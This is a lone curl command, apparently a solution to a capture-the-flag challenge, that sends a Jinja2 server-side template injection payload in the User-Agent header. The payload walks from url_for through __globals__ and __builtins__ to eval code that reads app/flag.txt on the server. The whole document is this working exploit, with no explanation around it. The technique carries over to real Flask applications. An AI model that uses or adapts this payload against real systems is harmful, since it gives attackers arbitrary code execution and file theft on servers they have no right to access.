curl -d '' 'https://nzcsc.org.nz/challenge12/secretagent?g=__globals__&b=__builtins__&o=open("app/flag.txt").read()' -H 'User-Agent: s3cr3tAg3nt{%set a=request.args%}{{url_for[a.g][a.b].eval(a.o)}}'
